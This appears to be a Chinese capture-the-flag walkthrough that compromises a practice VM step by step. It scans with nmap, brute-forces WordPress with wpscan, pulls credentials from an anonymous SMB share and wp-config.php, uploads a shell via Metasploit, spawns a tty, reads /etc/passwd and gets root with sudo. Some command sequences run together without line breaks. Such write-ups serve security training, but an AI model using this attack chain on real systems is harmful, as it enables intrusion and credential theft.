目标：1个flag

级别：初级

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.175

查看只开放22、80、139、445、3306、6667端口

3、WEB渗透测试

3.1 使用dirb和nikto进行扫描测试，发现wordpress站点

其中robots.txt中的站点没有有用信息

打开页面后显示用户名为togie

3.2 使用wpscan进行扫描发现用户为Admin和admin

wpscan --url http://192.168.207.175/wordpress -e u

3.3 使用wpscan进行密码爆破，爆破时间太长，考虑其他方法

wpscan --url http://192.168.207.175/wordpress -U admin -P /usr/share/wordlists/rockyou.txt

3.4 查看139和445端口，使用enum4linux进行探测，发现share目录

enum4linux 192.168.207.175

3.5 使用smbclient匿名用户连接共享目录

smbclient  '\\192.168.207.175\share$'get deets.txtget todolist.txt

在deets.txt查看到密码为：12345

3.6 进入到wordpress目录，查看wordpress配置文件

cd wordpressget wp-config.php

查看wp-config.php文件得到用户名：Admin，密码为：TogieMYSQL12345^^

3.7 使用metasploit的WordPress插件模板，获取到meterpreter

use exploit/unix/webapp/wp_admin_shell_uploadset rhosts 192.168.207.175set targeturi /wordpressset username adminset password TogieMYSQL12345^^exploit

3.8 进入到shell模式,并使用python生成tty

shellpython -c 'import pty; pty.spawn("/bin/sh")'

3.9 查看/etc/passwd，有togie用户，使用密码：12345登录

cat /etc/passwdsu - togie

4、系统提权

4.1 查看用户sudo权限为ALL，切换为root

sudo -lsudo su
